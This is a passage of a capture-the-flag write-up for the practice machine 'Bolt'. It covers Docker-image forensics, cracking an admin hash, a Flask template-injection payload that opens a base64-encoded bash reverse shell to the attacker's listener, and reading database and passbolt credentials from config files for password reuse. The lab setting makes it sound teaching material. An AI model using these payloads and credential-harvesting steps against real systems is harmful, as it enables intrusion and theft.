dr-xr-xr-x 187 root root 0 Oct 13 08:44 proc -rw-r--r-- 1 root root 116 Mar 5 2021 requirements.txt drwx------ 1 root root 4096 Mar 5 2021 root drwxr-xr-x 2 root root 4096 Mar 6 2019 run -rw-r--r-- 1 root root 955 Mar 5 2021 run.py drwxr-xr-x 2 root root 4096 Mar 6 2019 sbin drwxr-xr-x 2 root root 4096 Mar 6 2019 srv dr-xr-xr-x 13 root root 0 Oct 13 08:44 sys drwxrwxrwt 1 root root 4096 Oct 13 08:44 tmp drwxr-xr-x 1 root root 4096 Mar 5 2021 usr drwxr-xr-x 1 root root 4096 Mar 6 2019 var / # ls -la app total 24 drwxr-xr-x 1 root root 4096 Mar 5 2021 . drwxr-xr-x 1 root root 4096 Oct 13 08:55 .. -rw-r--r-- 1 root root 1058 Mar 5 2021 __init__.py drwxr-xr-x 1 root root 4096 Mar 5 2021 __pycache__ drwxr-xr-x 1 root root 4096 Mar 5 2021 base drwxr-xr-x 1 root root 4096 Mar 5 2021 home  We can find a SQLite3 database and the source code of a Flask application. We can transfer the files to our machine and analyze them. For that, we could compress all the files we want inside a ZIP archive, and then use nc:\n/ # apk update fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/main/x86_64/APKINDEX.tar.gz fetch http://dl-cdn.alpinelinux.org/alpine/v3.7/community/x86_64/APKINDEX.tar.gz v3.7.3-184-gffd32bfd09 [http://dl-cdn.alpinelinux.org/alpine/v3.7/main] v3.7.3-194-gcddd1b2302 [http://dl-cdn.alpinelinux.org/alpine/v3.7/community] OK: 9054 distinct packages available / # apk add zip (1/1) Installing zip (3.0-r4) Executing busybox-1.27.2-r11.trigger OK: 72 MiB in 27 packages / # zip -r src.zip .env db.sqlite3 *.py requirements.txt app / # nc 192.168.1.37 4444 \u0026lt; src.zip  From our machine, we get the ZIP archive and decompress it:\n$ nc -nlvp 4444  src.zip Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 192.168.1.37. Ncat: Connection from 192.168.1.37:52425. $ unzip src.zip  Now we are able to see the contents of the SQLite3 database, but it is only containing the user we have just created:\n$ sqlite3 db.sqlite3 SQLite version 3.32.3 Enter \".help\" for usage hints. sqlite\u0026gt; .tables User sqlite\u0026gt; select * from User; 1|asdf|asdf@bolt.htb|$1$wJuqE5Tc$rZXG8CmAsT8YAIfHAJdkr.|| sqlite\u0026gt; .quit  Reading the other files, we can see that .env contains a secret key:\nDEBUG=True SECRET_KEY=S3cr3t_K#Key DB_ENGINE=postgresql DB_NAME=appseed-flask DB_HOST=localhost DB_PORT=5432 DB_USERNAME=appseed DB_PASS=pass  As well as config.py, which contains a secret key and an e-mail address (support@bolt.htb):\n# -*- encoding: utf-8 -*- \"\"\" Copyright (c) 2019 - present AppSeed.us \"\"\" import os from decouple import config class Config(object): basedir = os.path.abspath(os.path.dirname(__file__)) # Set up the App SECRET_KEY SECRET_KEY = config('SECRET_KEY', default='S#perS3crEt_007') # This will create a file in \u0026lt;app\u0026gt; FOLDER SQLALCHEMY_DATABASE_URI = 'sqlite:///' + os.path.join(basedir, 'db.sqlite3') SQLALCHEMY_TRACK_MODIFICATIONS = False MAIL_SERVER = 'localhost' MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = 'support@bolt.htb' class ProductionConfig(Config): DEBUG = False # Security SESSION_COOKIE_HTTPONLY = True REMEMBER_COOKIE_HTTPONLY = True REMEMBER_COOKIE_DURATION = 3600 # PostgreSQL database SQLALCHEMY_DATABASE_URI = '{}://{}:{}@{}:{}/{}'.format( config( 'DB_ENGINE' , default='postgresql' ), config( 'DB_USERNAME' , default='appseed' ), config( 'DB_PASS' , default='pass' ), config( 'DB_HOST' , default='localhost' ), config( 'DB_PORT' , default=5432 ), config( 'DB_NAME' , default='appseed-flask' ) ) class DebugConfig(Config): DEBUG = True # Load all possible configurations config_dict = { 'Production': ProductionConfig, 'Debug' : DebugConfig }  We can try the secrets found as passwords in bolt.htb and passbolt.bolt.htb, but none of them work.\nAt this point, we have not got anything yet. We need to analyze the Docker image deeper.\nIf we decompress the TAR file, we have the following:\n$ 7z x image.tar $ tree . ├── 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950 │ ├── VERSION │ ├── json │ └── layer.tar ├── 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c │ ├── VERSION │ ├── json │ └── layer.tar ├── 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa │ ├── VERSION │ ├── json │ └── layer.tar ├── 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab │ ├── VERSION │ ├── json │ └── layer.tar ├── 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162 │ ├── VERSION │ ├── json │ └── layer.tar ├── 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b │ ├── VERSION │ ├── json │ └── layer.tar ├── 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad │ ├── VERSION │ ├── json │ └── layer.tar ├── 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf │ ├── VERSION │ ├── json │ └── layer.tar ├── 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json ├── 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77 │ ├── VERSION │ ├── json │ └── layer.tar ├── a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 │ ├── VERSION │ ├── json │ └── layer.tar ├── d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26 │ ├── VERSION │ ├── json │ └── layer.tar ├── image.tar ├── manifest.json └── repositories 11 directories, 37 files  We can see the history of a Docker image with the following command:\n$ docker images REPOSITORY TAG IMAGE ID CREATED SIZE flask-dashboard-adminlte_appseed-app latest 859e74798e6c 6 months ago 154MB $ docker history 859e74798e6c IMAGE CREATED CREATED BY SIZE COMMENT 859e74798e6c 7 months ago gunicorn --config gunicorn-cfg.py run:app 3.93kB \u0026lt;missing\u0026gt; 7 months ago sh 8.49kB \u0026lt;missing\u0026gt; 7 months ago gunicorn --config gunicorn-cfg.py run:app 6B \u0026lt;missing\u0026gt; 7 months ago gunicorn --config gunicorn-cfg.py run:app 16.4kB \u0026lt;missing\u0026gt; 7 months ago gunicorn --config gunicorn-cfg.py run:app 6B \u0026lt;missing\u0026gt; 7 months ago gunicorn --config gunicorn-cfg.py run:app 6.95MB \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c #(nop) CMD [\"gunicorn\" \"--config… 0B \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c #(nop) EXPOSE 5005 0B \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c pip3 install -r requirements.txt 28.3MB \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c apk --update add python3 py3-pip 53MB \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c #(nop) COPY dir:f385c9405a9b189a6… 61.2MB \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c #(nop) COPY multi:e0a96f9a5ad90dc… 2.86kB \u0026lt;missing\u0026gt; 7 months ago /bin/sh -c #(nop) ENV FLASK_APP=run.py 0B \u0026lt;missing\u0026gt; 2 years ago /bin/sh -c #(nop) CMD [\"/bin/sh\"] 0B \u0026lt;missing\u0026gt; 2 years ago /bin/sh -c #(nop) ADD file:aa17928040e31624c… 4.21MB  All of the directories shown with tree contain layers of the Docker image, which have the differential changes in files when running each line of the Dockerfile (more information here).\nWe should list the contents of every layer.tar file and see if there is something interesting. First, let\u0026rsquo;s see if there is a file db.sqlite3 inside any layer.tar:\n$ for dir in `find . | grep layer`; do (7z l $dir | grep -q db\\.sqlite3) \u0026\u0026 echo $dir; done ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar $ 7z l 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2021-03-05 19:37:51 D.... 0 0 app 2021-03-05 19:45:48 D.... 0 0 app/base 2021-03-05 19:45:45 ..... 0 0 app/base/.wh.forms.py 2021-03-05 19:45:48 ..... 0 0 app/base/.wh.routes.py 2021-03-05 15:11:29 D.... 0 0 app/base/templates 2021-03-05 19:45:55 D.... 0 0 app/base/templates/accounts 2021-03-05 19:45:55 ..... 0 0 app/base/templates/accounts/.wh.register.html 2021-03-05 19:45:09 ..... 0 0 .wh.db.sqlite3 2021-03-05 19:39:12 D.... 0 0 root 2021-03-05 19:46:46 ..... 6 512 root/.ash_history 2021-03-05 19:44:48 D.... 0 0 tmp ------------------- ----- ------------ ------------ ------------------------ 2021-03-05 19:46:46 6 512 5 files, 6 folders $ 7z l a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar Date Time Attr Size Compressed Name ------------------- ----- ------------ ------------ ------------------------ 2021-03-05 19:44:04 ..... 16384 16384 db.sqlite3 2021-03-05 19:39:12 D.... 0 0 root 2021-03-05 19:44:29 ..... 6 512 root/.ash_history 2021-03-05 19:41:00 D.... 0 0 tmp ------------------- ----- ------------ ------------ ------------------------ 2021-03-05 19:44:29 16390 16896 2 files, 2 folders  If we decompress this last layer.tar and see the contents of the SQLite3 database, we will see a hashed password for the user admin:\n$ cd a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2 $ 7z x layer.tar $ sqlite3 db.sqlite3 SQLite version 3.32.3 Enter \".help\" for usage hints. sqlite .tables User sqlite select * from User; 1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.|| sqlite .quit  Foothold We can crack this hash using john:\n$ echo '$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.' \u0026gt; hash $ john --wordlist=$WORDLISTS/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt [MD5 32/64 X2]) Press 'q' or Ctrl-C to abort, almost any other key for status deadbolt (?) 1g 0:00:00:11 DONE 0.08928g/s 15422p/s 15422c/s 15422C/s deadbolt..deadbeat Use the \"--show\" option to display all of the cracked passwords reliably Session completed  Accessing bolt.htb as admin And now we have a potential username and password (admin:deadbolt). If we try to login in bolt.htb we will enter as admin:\nThis website looks the same as the one hosted in the Docker image. This time, there is sensitive information in a \u0026ldquo;Direct Chat\u0026rdquo; conversation:\nFrom this chat, we obtain some names (Alexander Pierce, Sarah Bullock and Eddie). Sarah says that their demo is invite only. There is something about e-mail and everything seems to be related to the Docker image.\nAs they are talking about demo and e-mail, maybe there are more subdomains. We can use gobuster to fuzz for valid subdomains:\n$ gobuster vhost -w $WORDLISTS/dirb/small.txt -u bolt.htb -q Found: demo.bolt.htb (Status: 302) [Size: 219] Found: mail.bolt.htb (Status: 200) [Size: 4943]  We have two new subdomains to explore and add to /etc/hosts.\nThe following one is mail.bolt.htb, which prompts a login page. We can try to login with support@bolt.htb or admin@bolt.htb using some of the passwords and secret keys found, but with no success:\nAnd the other new subdomain is demo.bolt.htb, which is really similar to bolt.htb, at least the login and register forms. However, this time we need an invite code to register (as Sarah Bullock was saying). Recall that registration was not working in bolt.htb:\nDiving deeply into the Docker image This demo website might be similar to the one inside the Docker image. After analyzing the source code transfered from the Docker container in a ZIP file, we cannot find nothing useful.\nAt this point, we should imagine that there might be something inside the layers of the image, that then was removed for security reasons. To enumerate, we can list the layers that contain Python code and then decompress those layers:\n$ for dir in `find . | grep layer`; do (7z l $dir | grep -q \\.py) \u0026\u0026 echo $dir; done ./9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar ./3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar ./3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar ./2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar ./3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar ./d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar ./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar $ for dir in `find . | grep layer | awk -F / '{ print $2 }'`; do (7z l $dir/layer.tar | grep -q \\.py) \u0026\u0026 7z x -o\"$dir\" $dir/layer.tar; done  Now we have extracted every layer containing Python code, we can search for \u0026ldquo;invite\u0026rdquo;:\n$ grep -nri invite . | grep -v Binary ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/forms.py:20: invite_code = TextField('Invite Code', id='invite_code' , validators=[DataRequired()]) ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/templates/accounts/register.html:72: {{ form.invite_code(placeholder=\"Invite Code\", class=\"form-control\") }} ./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py:63: code = request.form['invite_code']  Inside 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py we will find a hard-coded invite code (XNSS-HSJW-3NGU-8XTJ), inside the register() function:\n@blueprint.route('/register', methods=['GET', 'POST']) def register(): login_form = LoginForm(request.form) create_account_form = CreateAccountForm(request.form) if 'register' in request.form: username = request.form['username'] email = request.form['email'] code = request.form['invite_code'] if code != 'XNSS-HSJW-3NGU-8XTJ': return render_template('code-500.html') data = User.query.filter_by(email=email).first() if data is None and code == 'XNSS-HSJW-3NGU-8XTJ': # Check usename exists user = User.query.filter_by(username=username).first() if user: return render_template('accounts/register.html', msg='Username already registered', success=False, form=create_account_form) # Check email exists user = User.query.filter_by(email=email).first() if user: return render_template('accounts/register.html', msg='Email already registered', success=False, form=create_account_form) # else we can create the user user = User(**request.form) db.session.add(user) db.session.commit() return render_template('accounts/register.html', msg='User created please \u0026lt;a href=\"/login\"\u0026gt;login\u0026lt;/a\u0026gt;', success=True, form=create_account_form) else: return render_template('accounts/register.html', form=create_account_form)  Finding SSTI Now we can try and register into demo.bolt.htb using this invite code. And it works, we are inside another AdminLTE 3:\nFurthermore, we have another account in mail.bolt.htb, which is automatically created. We can enter using the same credentials:\nHowever, we are not able to send e-mails because there is an error on the SMTP service.\nWe have reached another point where there seems to be nothing more to do.\nWe can see on AdminLTE 3 that we can change our name, experience and skills clicking on \u0026ldquo;Settings\u0026rdquo;. As we know the web application is using Flask, we could try to perform a Server-Side Template Injection (SSTI):\nAfter submitting the changes, we receive a confirmation e-mail at mail.bolt.htb:\nIf we click on the provided link, we receive another e-mail showing us the changes made. This e-mail feature is vulnerable to SSTI, because we are seeing 49 instead of {{7*7}}, as we entered:\nSSTI leads to Remote Code Execution (RCE), so we can get a reverse shell to the machine with some payload found in PayloadsAllTheThings.\nWe can do the following steps:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  The payload to put in the name field of AdminLTE 3 is:\n{{cycler.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash').read()}}  And then, confirming the changes on the e-mail, we get a connection to the nc listener as www-data:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.114. Ncat: Connection from 10.10.11.114:42396. bash: cannot set terminal process group (1009): Inappropriate ioctl for device bash: no job control in this shell www-data@bolt:~/demo$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@bolt:~/demo$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444 reset xterm www-data@bolt:~/demo$ export TERM=xterm www-data@bolt:~/demo$ export SHELL=bash www-data@bolt:~/demo$ stty rows 50 columns 158  System enumeration There are two users: clark and eddie, and we are not allowed to list their home directories.\nwww-data@bolt:~/demo$ ls -la /home total 16 drwxr-xr-x 4 root root 4096 Mar 3 2021 . drwxr-xr-x 20 root root 4096 Aug 4 13:07 .. drwxr-x--- 15 clark clark 4096 Feb 25 2021 clark drwxr-x--- 16 eddie eddie 4096 Oct 13 07:01 eddie www-data@bolt:~/demo$ ls -la /home/clark ls: cannot open directory '/home/clark': Permission denied www-data@bolt:~/demo$ ls -la /home/eddie ls: cannot open directory '/home/eddie': Permission denied  We can obtain MySQL database credentials inside the file config.py:\nwww-data@bolt:~/demo$ ls -la total 36 drwxr-xr-x 5 www-data www-data 4096 Aug 4 13:06 . drwxr-xr-x 6 root root 4096 Aug 4 13:06 .. -rw-r--r-- 1 www-data www-data 6399 Mar 6 2021 app.py -rw-r--r-- 1 www-data www-data 420 Mar 4 2021 config.py drwxr-xr-x 2 www-data www-data 4096 Mar 6 2021 __pycache__ drwxr-xr-x 3 www-data www-data 4096 Mar 4 2021 static drwxrwxr-x 6 www-data www-data 4096 Mar 5 2021 templates -rw-r--r-- 1 www-data www-data 62 Mar 4 2021 wsgi.py www-data@bolt:~/demo$ cat config.py  \"\"\"Flask Configuration\"\"\" #SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db' SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail' SQLALCHEMY_TRACK_MODIFICATIONS = True SECRET_KEY = 'kreepandcybergeek' MAIL_SERVER = 'localhost' MAIL_PORT = 25 MAIL_USE_TLS = False MAIL_USE_SSL = False #MAIL_DEBUG = app.debug MAIL_USERNAME = None MAIL_PASSWORD = None DEFAULT_MAIL_SENDER = 'support@bolt.htb'  Now we can access database boltmail with bolt_dba:dXUUHSW9vBpH5qRB credentials:\nwww-data@bolt:~/demo$ mysql --user=bolt_dba --password=dXUUHSW9vBpH5qRB --database=boltmail mysql\u0026gt; show tables; +--------------------+ | Tables_in_boltmail | +--------------------+ | user | +--------------------+ 1 row in set (0.00 sec) mysql\u0026gt; describe user; +-----------------+---------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +-----------------+---------------+------+-----+---------+----------------+ | id | int | NO | PRI | NULL | auto_increment | | username | varchar(255) | YES | | NULL | | | password | varchar(255) | YES | | NULL | | | email | varchar(255) | YES | | NULL | | | host_header | varchar(255) | YES | | NULL | | | ip_address | varchar(255) | YES | | NULL | | | email_confirmed | tinyint(1) | YES | | NULL | | | profile_confirm | tinyint(1) | YES | | NULL | | | profile_update | varchar(4096) | YES | | NULL | | +-----------------+---------------+------+-----+---------+----------------+ 9 rows in set (0.00 sec) mysql\u0026gt; select username, password from user; +-------------+------------------------------------+ | username | password | +-------------+------------------------------------+ | admin | $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q. | | asdf | $1$KsE5LxFN$Xo2Xo.DRX82fo8D2.fSo/1 | +-------------+------------------------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; exit  Despite having found a hashed password for user admin, this one was found and cracked before.\nThinking on the passbolt.bolt.htb subdomain, we could explore some configuration files for that service. We can find a PHP file containing MySQL credentials to passboltdb database (passbolt:rT2;jW7\u0026lt;eY8!dX8}pQ8%):\nwww-data@bolt:~/demo$ cat /etc/passbolt/passbolt.php  \u0026lt;?php /** * ... */ return [ 'App' =\u0026gt; [ // A base URL to use for absolute links. // The url where the passbolt instance will be reachable to your end users. // This information is need to render images in emails for example 'fullBaseUrl' =\u0026gt; 'https://passbolt.bolt.htb', ], // Database configuration. 'Datasources' =\u0026gt; [ 'default' =\u0026gt; [ 'host' =\u0026gt; 'localhost', 'port' =\u0026gt; '3306', 'username' =\u0026gt; 'passbolt', 'password' =\u0026gt; 'rT2;jW7\u0026lt;eY8!dX8}pQ8%', 'database' =\u0026gt; 'passboltdb', ], ], // Email configuration. 'EmailTransport' =\u0026gt; [ 'default' =\u0026gt; [ 'host' =\u0026gt; 'localhost', 'port' =\u0026gt; 587, 'username' =\u0026gt; null, 'password' =\u0026gt; null, // Is this a secure connection? true if yes, null if no. 'tls' =\u0026gt; true, //'timeout' =\u0026gt; 30, //'client' =\u0026gt; null, //'url' =\u0026gt; null, ], ], 'Email' =\u0026gt; [ 'default' =\u0026gt; [ // Defines the default name and email of the sender of the emails. 'from' =\u0026gt; ['localhost@bolt.htb' =\u0026gt; 'localhost'], //'charset' =\u0026gt; 'utf-8', //'headerCharset' =\u0026gt; 'utf-8', ], ], 'passbolt' =\u0026gt; [ // GPG Configuration. // The keyring must to be owned and accessible by the webserver user. // Example: www-data user on Debian 'gpg' =\u0026gt; [ // Main server key. 'serverKey' =\u0026gt; [ // Server private key fingerprint. 'fingerprint' =\u0026gt; '59860A269E803FA094416753AB8E2EFB56A16C84', 'public' =\u0026gt; CONFIG . DS . 'gpg' . DS . 'serverkey.asc', 'private' =\u0026gt; CONFIG . DS . 'gpg' . DS . 'serverkey_private.asc', ], ], 'registration' =\u0026gt; [ 'public' =\u0026gt; false, ], 'ssl' =\u0026gt; [ 'force' =\u0026gt; true, ] ], ];  Now we can connect to that database with the credentials found:\nwww-data@bolt:~/demo$ mysql --user=passbolt --password='rT2;jW7\u0026lt;eY8!dX8}pQ8%' --database=passboltdb mysql\u0026gt; show tables; +-----------------------+ | Tables_in_passboltdb | +-----------------------+ | account_settings | | action_logs | | actions | | authentication_tokens | | avatars | | comments | | email_queue | | entities_history | | favorites | | gpgkeys | | groups | | groups_users | | organization_settings | | permissions | | permissions_history | | phinxlog | | profiles | | resource_types | | resources | | roles | | secret_accesses | | secrets | | secrets_history | | user_agents | | users | +-----------------------+ 25 rows in set (0.01 sec) mysql\u0026gt; describe secrets; +-------------+------------+------+-----+---------+-------+ | Field | Type | Null | Key | Default | Extra | +-------------+------------+------+-----+---------+-------+ | id | char(36) | NO | PRI | NULL | | | user_id | char(36) | NO | MUL | NULL | | | resource_id | char(36) | NO | MUL | NULL | | | data | mediumtext | NO | | NULL | | | created | datetime | NO | | NULL | | | modified | datetime | NO | | NULL | | +-------------+------------+------+-----+---------+-------+ 6 rows in set (0.00 sec) mysql\u0026gt; select * from secrets\\G *************************** 1. row *************************** id: 643a8b12-c42c-4507-8646-2f8712af88f8 user_id: 4e184ee6-e436-47fb-91c9-dccb57f250bc resource_id: cd0270db-c83f-4f44-b7ac-76609b397746 data: -----BEGIN PGP MESSAGE----- Version: OpenPGP.js v4.10.9 Comment: https://openpgpjs.org wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7 FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov 8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey 5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6 TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984 =P38i -----END PGP MESSAGE----- created: 2021-02-25 21:50:11 modified: 2021-03-06 15:34:36 1 row in set (0.00 sec) mysql\u0026gt; exit  In this database we find the two users that are defined in the machine, and also a secret message encrypted using PGP. The database contains PGP public keys, but there are not so important.\nLateral movement to user eddie And yet another dead end. We can try to switch user to eddie and enter some of the passwords found. Curiously, password rT2;jW7\u0026lt;eY8!dX8}pQ8% (reused in MySQL) works:\n$ ssh eddie@10.10.11.114 eddie@10.10.11.114's password: eddie@bolt:~$ cat user.txt 1d32df183e61b198aa42469ede79fd61  Having captured the user.txt flag, we can continue looking for files owned by eddie:\neddie@bolt:~$ find / -user eddie 2\u0026gt;/dev/null | grep -vE 'home|proc|sys|run|dev|tmp' /var/mail/eddie eddie@bolt:~$ cat /var/mail/eddie From clark@bolt.htb Thu Feb 25 14:20:19 2021 Return-Path: \u0026lt;clark@bolt.htb\u0026gt; X-Original-To: eddie@bolt.htb Delivered-To: eddie@bolt.htb Received: by bolt.htb (Postfix, from userid 1001) id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST) Subject: Important! To: \u0026lt;eddie@bolt.htb\u0026gt; X-Mailer: mail (GNU Mailutils 3.7) Message-Id: \u0026lt;20210225212019.DFF264CD@bolt.htb\u0026gt; Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST) From: Clark Griswold \u0026lt;clark@bolt.htb\u0026gt; Hey Eddie, The password management server is up and running. Go ahead and download the extension to your browser and get logged in. Be sure to back up your private key because I CANNOT recover it. Your private key is the only way to recover your account. Once you're set up you can start importing your passwords. Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning... -Clark  Privilege escalation We have found an interesting e-mail from clark telling eddie to use a browser extension and to save his private key.\nThere are files related to Google Chrome in eddie\u0026rsquo;s home directory, maybe the extension configuration is there.\nLooking for a PGP private key We can search for PGP contents inside the home directory:\neddie@bolt:~$ grep -r 'BEGIN PGP' ~ /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js: if (!message.match(/-----BEGIN PGP MESSAGE-----/)) { /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PUBLIC_HEADER = '-----BEGIN PGP PUBLIC KEY BLOCK-----'; /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----'; /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: const reHeader = /^-----BEGIN PGP (MESSAGE, PART \\d+\\/\\d+|MESSAGE, PART \\d+|SIGNED MESSAGE|MESSAGE|PUBLIC KEY BLOCK|PRIVATE KEY BLOCK|SIGNATURE)-----$/m; /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP MESSAGE, PART X/Y /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP MESSAGE, PART X /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP SIGNED MESSAGE /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP MESSAGE /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP PUBLIC KEY BLOCK /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP PRIVATE KEY BLOCK /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // BEGIN PGP SIGNATURE /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: // cleartext signatures. Note that PGP 2.x uses BEGIN PGP MESSAGE /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP MESSAGE, PART \" + partindex + \"/\" + parttotal + \"-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"-----BEGIN PGP MESSAGE, PART \" + partindex + \"-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: result.push(\"\\r\\n-----BEGIN PGP SIGNED MESSAGE-----\\r\\n\"); /home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js: 